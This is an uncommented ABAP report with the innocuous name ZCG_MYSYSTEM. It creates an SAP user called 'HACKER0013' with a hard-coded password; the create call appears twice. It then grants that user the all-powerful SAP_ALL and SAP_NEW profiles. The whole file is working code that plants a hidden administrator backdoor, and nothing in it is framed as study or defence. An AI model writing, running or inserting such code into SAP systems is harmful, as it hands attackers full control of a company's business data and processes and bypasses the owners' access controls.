*&---------------------------------------------------------------------*
*& Report ZCG_MYSYSTEM
*&---------------------------------------------------------------------*
*&
*&---------------------------------------------------------------------*
REPORT zcg_mysystem.

DATA: profiles TYPE TABLE OF bapiprof.
DATA: prof_ret TYPE TABLE OF bapiret2.

DATA(usr) = CONV xubname( 'HACKER0013' ).

DATA(result) = VALUE bapiret2( ).

DATA(logondata) = VALUE bapilogond( ustyp = 'A' ).
DATA(address)   = VALUE bapiaddr3( lastname = 'Doe' ).

CALL FUNCTION 'BAPI_USER_CREATE1'
  EXPORTING
    username  = usr
    logondata = logondata
    password  = CONV xuncode( 'Start123!' )
    address   = address.

CALL FUNCTION 'BAPI_USER_CREATE1'
  EXPORTING
    username  = usr
    logondata = logondata
    password  = CONV xuncode( 'Start123!' )
    address   = address.

APPEND VALUE bapiprof( bapiprof = 'SAP_ALL' ) TO profiles.
APPEND VALUE bapiprof( bapiprof = 'SAP_NEW' ) TO profiles.

CALL FUNCTION 'BAPI_USER_PROFILES_ASSIGN'
  EXPORTING
    username = usr
  TABLES
    profiles = profiles
    return   = prof_ret.
